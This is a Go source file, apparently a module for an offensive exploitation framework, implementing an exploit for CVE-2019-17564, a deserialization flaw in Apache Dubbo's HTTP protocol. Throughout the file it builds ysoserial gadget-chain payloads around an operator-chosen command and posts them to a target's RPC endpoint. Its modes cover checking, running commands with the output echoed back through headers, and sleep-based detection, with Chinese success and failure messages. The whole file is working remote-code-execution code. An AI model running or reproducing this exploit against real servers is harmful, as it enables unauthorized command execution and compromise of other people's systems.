package exp_Apache_Dubbo

import (
	"github.com/lz520520/railgunlib/pkg/gadgets"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"time"
)

type Exp_CVE_2019_17564 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2019_17564) Attack_check() (expResult exp_model.ExpResult) {
	headers := self.GetInitExpHeaders()
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), self.MustGetStringParam("cmd"))
	RPC := self.MustGetStringParam("RPC")
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/"+RPC), string(payload), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoInfoMsg("无回显，自行检查")
	return
}

func (self *Exp_CVE_2019_17564) Attack_cmd() (expResult exp_model.ExpResult) {
	headers := self.GetInitExpHeaders()
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), self.MustGetStringParam("cmd"))
	RPC := self.MustGetStringParam("RPC")
	// cmd插入头部
	self.AddEncodeCmdHeader(headers, self.MustGetStringParam("cmd"))
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/"+RPC), string(payload), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	if self.CheckRespHeader(httpresp.Resp.Header) {
		self.EchoSuccessMsg("利用成功")
		expResult.Status = true
		// 解码响应数据
		result, err := self.ParserEncodeCmdResult(httpresp.Body)
		if err != nil {
			expResult.Err = err.Error()
			return
		}
		self.EchoSuccessMsg(result)
	} else {
		self.EchoErrMsg("利用失败")
	}

	return
}

func (self *Exp_CVE_2019_17564) subSleep() (err error) {
	headers := self.GetInitExpHeaders()
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), "")
	RPC := self.MustGetStringParam("RPC")
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/"+RPC), string(payload), headers)
	if httpresp.Err != nil {
		err = httpresp.Err
		return
	}
	return
}

func (self *Exp_CVE_2019_17564) Attack_sleep() (expResult exp_model.ExpResult) {
	self.CheckGagdetWithSleep(self.subSleep, 10*time.Second)

	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_CVE_2019_17564{}, "exp_CVE_2019_17564.yml")

}
